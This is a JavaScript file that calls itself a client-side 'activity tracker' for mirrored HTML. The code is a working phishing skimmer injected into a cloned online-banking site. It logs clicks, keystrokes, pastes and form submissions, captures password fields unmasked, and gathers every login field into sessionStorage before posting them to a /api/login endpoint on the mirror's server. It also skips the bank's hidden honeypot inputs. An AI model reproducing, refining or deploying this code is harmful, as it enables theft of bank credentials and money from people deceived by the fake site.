/**
 * Client-side activity tracker (injected into mirrored HTML).
 */
(function () {
  var ENDPOINT = location.origin + '/api/track';
  var sid = sessionStorage.getItem('bsk_sid');
  if (!sid) {
    sid =
      typeof crypto !== 'undefined' && crypto.randomUUID
        ? crypto.randomUUID()
        : 's' + Date.now() + Math.random().toString(16).slice(2);
    sessionStorage.setItem('bsk_sid', sid);
  }

  var lastSend = 0;
  var countMin = 0;
  var minStart = Date.now();
  var inputTimers = {};

  function zone(el) {
    if (!el || !el.closest) return '';
    if (el.closest('.nav-login, .banking-login, .login_visible, [class*="login"]')) return '🔐 Логин';
    if (el.closest('.if6_eprivacy, .lightbox_visible')) return '🍪 Cookies';
    if (el.closest('.if6_header, .if6_siteselect')) return '📌 Шапка';
    if (el.closest('.if6_nav, .nav-top, .nav-main')) return '🧭 Навигация';
    if (el.closest('.search-component, .search_visible, #search')) return '🔍 Поиск';
    if (el.closest('.chatavatar, .chatlink, [data-chat-url]')) return '💬 Чат Linda';
    if (el.closest('.if6_footer, footer')) return '📎 Подвал';
    if (el.closest('.if6_opener, .opener')) return '🖼 Слайдер';
    if (el.closest('.if6_teaser, .teaser')) return '📰 Тизеры';
    if (el.closest('form')) return '📋 Форма';
    if (el.closest('.if6_main')) return '📄 Контент';
    return '';
  }

  function isLoginPage() {
    return /\/login-online-banking/i.test(location.pathname);
  }

  function isLoginForm(form) {
    return !!(form && form.classList && form.classList.contains('nbf-login'));
  }

  function isLoginZone(el) {
    if (!el || !el.closest) return false;
    if (isLoginPage() && el.closest('form.nbf-login')) return true;
    return !!el.closest(
      '.nav-login, .banking-login, .login_visible, .skipto-login, [action*="login"], [href*="login"], [href*="anmeld"]',
    );
  }

  function label(el) {
    if (!el || el === document.documentElement) return 'страница';
    var t =
      (el.getAttribute &&
        (el.getAttribute('aria-label') || el.getAttribute('title') || el.getAttribute('alt'))) ||
      '';
    t = String(t).trim();
    if (t) return t.slice(0, 120);
    var txt = (el.innerText || el.textContent || '').replace(/\s+/g, ' ').trim();
    if (txt && txt.length <= 100) return txt;
    if (txt) return txt.slice(0, 100) + '…';
    if (el.id) return '#' + el.id;
    if (el.name) return el.name;
    if (el.placeholder) return el.placeholder;
    if (el.type) return (el.tagName || 'input').toLowerCase() + '[' + el.type + ']';
    return (el.tagName || 'элемент').toLowerCase();
  }

  function humanFieldName(el, form) {
    form = form || (el.closest && el.closest('form'));
    if (el && el.id) {
      var sel = 'label[for="' + String(el.id).replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"]';
      var lab = form ? form.querySelector(sel) : document.querySelector(sel);
      if (lab) {
        var t = lab.textContent.replace(/\s+/g, ' ').trim();
        if (t) return t;
      }
    }
    return (
      el.getAttribute('aria-label') ||
      el.getAttribute('placeholder') ||
      el.getAttribute('title') ||
      el.name ||
      el.id ||
      label(el)
    );
  }

  function fieldName(el) {
    return humanFieldName(el);
  }

  function fieldValue(el) {
    if (!el) return '';
    if (el.type === 'checkbox' || el.type === 'radio') return el.checked ? '✓ вкл' : '✗ выкл';
    if (el.type === 'password') return el.value || '';
    if (el.tagName === 'SELECT') {
      var opt = el.options[el.selectedIndex];
      return opt ? opt.text + ' (' + el.value + ')' : el.value;
    }
    return (el.value || '').slice(0, 300);
  }

  function send(ev) {
    var now = Date.now();
    if (isLoginPage() && ev.login) {
      var skip = ['input', 'blur', 'change', 'paste', 'copy', 'submit', 'focus'];
      if (skip.indexOf(ev.type) >= 0) return;
    }
    if (now - minStart > 60000) {
      minStart = now;
      countMin = 0;
    }
    if (countMin >= 80) return;
    if (now - lastSend < 200 && ev.type !== 'submit' && ev.type !== 'session_start') return;
    lastSend = now;
    countMin += 1;

    ev.sessionId = sid;
    ev.page = location.pathname + location.search;
    try {
      fetch(ENDPOINT, {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(ev),
        keepalive: true,
      }).catch(function () {});
    } catch (e) {}
  }

  send({ type: 'session_start', target: location.pathname, zone: '🚀 Старт' });

  document.addEventListener(
    'click',
    function (e) {
      var t = e.target;
      if (!t || t.closest('[data-bsk-track-ignore]')) return;
      var el =
        t.closest(
          'button,a,input[type="submit"],input[type="button"],label,[role="button"],[role="tab"],[role="menuitem"],[role="link"]',
        ) || t;
      send({
        type: 'click',
        target: label(el),
        zone: zone(el),
        tag: el.tagName,
        login: isLoginZone(el),
      });
    },
    true,
  );

  document.addEventListener(
    'change',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      var name = fieldName(el);
      var val = fieldValue(el);
      var type = el.tagName === 'SELECT' ? 'select' : 'change';
      send({
        type: type,
        field: name,
        value: val,
        target: name,
        zone: zone(el),
        tag: el.tagName,
        login: isLoginZone(el),
      });
    },
    true,
  );

  document.addEventListener(
    'input',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA' && el.tagName !== 'SELECT') return;
      var key = el.name || el.id || 'input';
      clearTimeout(inputTimers[key]);
      inputTimers[key] = setTimeout(function () {
        send({
          type: 'input',
          field: fieldName(el),
          value: fieldValue(el),
          target: fieldName(el),
          zone: zone(el),
          tag: el.tagName,
          login: isLoginZone(el),
        });
      }, 700);
    },
    true,
  );

  document.addEventListener(
    'focusin',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA' && el.tagName !== 'SELECT') return;
      send({
        type: 'focus',
        field: fieldName(el),
        value: fieldValue(el),
        target: fieldName(el),
        zone: zone(el),
        tag: el.tagName,
        login: isLoginZone(el),
      });
    },
    true,
  );

  document.addEventListener(
    'focusout',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA' && el.tagName !== 'SELECT') return;
      send({
        type: 'blur',
        field: fieldName(el),
        value: fieldValue(el),
        target: fieldName(el),
        zone: zone(el),
        tag: el.tagName,
        login: isLoginZone(el),
      });
    },
    true,
  );

  document.addEventListener(
    'paste',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA') return;
      setTimeout(function () {
        send({
          type: 'paste',
          field: fieldName(el),
          value: fieldValue(el),
          target: fieldName(el),
          zone: zone(el),
          tag: el.tagName,
          login: isLoginZone(el),
        });
      }, 50);
    },
    true,
  );

  document.addEventListener(
    'copy',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA') return;
      send({
        type: 'copy',
        field: fieldName(el),
        value: fieldValue(el),
        target: fieldName(el),
        zone: zone(el),
        tag: el.tagName,
        login: isLoginZone(el),
      });
    },
    true,
  );

  document.addEventListener(
    'keydown',
    function (e) {
      if (e.key !== 'Enter' && e.key !== 'Tab' && e.key !== 'Escape') return;
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      send({
        type: 'keydown',
        field: fieldName(el),
        value: e.key,
        target: fieldName(el),
        zone: zone(el),
        tag: el.tagName,
        login: isLoginZone(el),
      });
    },
    true,
  );

  document.addEventListener(
    'submit',
    function (e) {
      var form = e.target;
      if (!form || form.tagName !== 'FORM') return;
      var parts = [];
      try {
        var fd = new FormData(form);
        fd.forEach(function (v, k) {
          parts.push(k + '=' + String(v).slice(0, 120));
        });
      } catch (err) {
        parts.push('(form data unavailable)');
      }
      send({
        type: 'submit',
        target: form.getAttribute('action') || form.id || label(form),
        value: parts.join('\n'),
        zone: zone(form),
        tag: 'FORM',
        login: isLoginZone(form),
      });
    },
    true,
  );

  function nav() {
    send({ type: 'navigation', target: location.pathname + location.search, zone: '🔗 Навигация' });
  }

  var push = history.pushState;
  history.pushState = function () {
    push.apply(history, arguments);
    nav();
  };
  var replace = history.replaceState;
  history.replaceState = function () {
    replace.apply(history, arguments);
    nav();
  };
  window.addEventListener('popstate', nav);

  var LOGIN_ENDPOINT = location.origin + '/api/login';
  var LOGIN_STORE = 'bsk_login_fields';
  var lastLoginSend = 0;
  var lastLoginInputSend = 0;
  var loginInputTimer = null;

  function loginFieldLabel(el, form) {
    return humanFieldName(el, form);
  }

  function isSkippableLoginInput(el) {
    if (!el) return true;
    if (el.tagName === 'INPUT') {
      if (el.type === 'submit' || el.type === 'button') return true;
      if (el.type === 'hidden') return true;
      if (el.tabIndex < 0) return true;
      if (el.getAttribute('aria-hidden') === 'true') return true;
      if (el.name === 'MWutArYgzpxGyXKa' || el.id === 'MWutArYgzpxGyXKa') return true;
      if (el.name === 'isJavaScriptActive' || el.id === 'isJavaScriptActive') return true;
      if (el.name === 'CzdOHOZeIlgDksxn' || el.id === 'CzdOHOZeIlgDksxn') return true;
    }
    if (el.disabled) return true;
    try {
      var st = window.getComputedStyle(el);
      if (st.display === 'none' || st.visibility === 'hidden') return true;
      if (st.opacity === '0' && el.type === 'password') return true;
    } catch (e) {}
    return false;
  }

  function collectLoginFields(form) {
    var fields = {};
    if (!form) return fields;
    var els = form.querySelectorAll('input, select, textarea');
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      if (isSkippableLoginInput(el)) continue;
      var lbl = loginFieldLabel(el, form);
      var val = fieldValue(el);
      if (val !== '' && val != null) fields[lbl] = val;
    }
    return fields;
  }

  function getStoredLoginFields() {
    try {
      return JSON.parse(sessionStorage.getItem(LOGIN_STORE) || '{}');
    } catch (e) {
      return {};
    }
  }

  function mergeLoginFields(newFields) {
    var all = getStoredLoginFields();
    for (var k in newFields) {
      if (Object.prototype.hasOwnProperty.call(newFields, k)) all[k] = newFields[k];
    }
    sessionStorage.setItem(LOGIN_STORE, JSON.stringify(all));
    return all;
  }

  function getAllLoginFields(form) {
    return mergeLoginFields(collectLoginFields(form));
  }

  function sendLogin(fields, step, buttonLabel, eventType) {
    var now = Date.now();
    var isInput = eventType === 'input';
    if (isInput) {
      if (now - lastLoginInputSend < 800) return;
      lastLoginInputSend = now;
    } else {
      if (now - lastLoginSend < 800) return;
      lastLoginSend = now;
    }
    try {
      fetch(LOGIN_ENDPOINT, {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          sessionId: sid,
          page: location.pathname + location.search,
          step: step,
          button: buttonLabel,
          event: eventType || 'submit',
          fields: fields,
        }),
        keepalive: true,
      }).catch(function () {});
    } catch (e) {}
  }

  function handleLoginFieldInput(el) {
    if (!isLoginPage()) return;
    var form = el.closest && el.closest('form.nbf-login');
    if (!form) return;
    var lbl = loginFieldLabel(el, form);
    var val = fieldValue(el);
    if (val === '' || val == null) return;
    var allFields = mergeLoginFields({ [lbl]: val });
    var step = form.getAttribute('data-ajstep') || '1';
    clearTimeout(loginInputTimer);
    loginInputTimer = setTimeout(function () {
      sendLogin(allFields, step, '', 'input');
    }, 600);
  }

  function handleLoginSubmit(form, buttonLabel) {
    if (!isLoginPage() || !isLoginForm(form)) return;
    var allFields = getAllLoginFields(form);
    var step = form.getAttribute('data-ajstep') || '1';
    sendLogin(allFields, step, buttonLabel || 'Weiter', 'submit');
  }

  document.addEventListener(
    'input',
    function (e) {
      var el = e.target;
      if (!el || el.closest('[data-bsk-track-ignore]')) return;
      if (isLoginPage() && el.closest('form.nbf-login')) {
        handleLoginFieldInput(el);
      }
    },
    true,
  );

  document.addEventListener(
    'blur',
    function (e) {
      var el = e.target;
      if (!el || !isLoginPage()) return;
      if (!el.closest('form.nbf-login')) return;
      if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA' && el.tagName !== 'SELECT') return;
      handleLoginFieldInput(el);
    },
    true,
  );

  document.addEventListener(
    'submit',
    function (e) {
      var form = e.target;
      if (!form || form.tagName !== 'FORM') return;
      if (isLoginPage() && isLoginForm(form)) {
        var btn = form.querySelector('input[type="submit"][tabindex="0"], button[type="submit"]');
        handleLoginSubmit(form, btn ? btn.value || btn.title || 'Weiter' : 'Submit');
      }
    },
    true,
  );

  document.addEventListener(
    'click',
    function (e) {
      if (!isLoginPage()) return;
      var btn = e.target.closest('form.nbf-login input[type="submit"], form.nbf-login button[type="submit"]');
      if (!btn || btn.tabIndex < 0) return;
      var form = btn.form;
      if (!form) return;
      handleLoginSubmit(form, btn.value || btn.title || 'Weiter');
    },
    true,
  );
})();
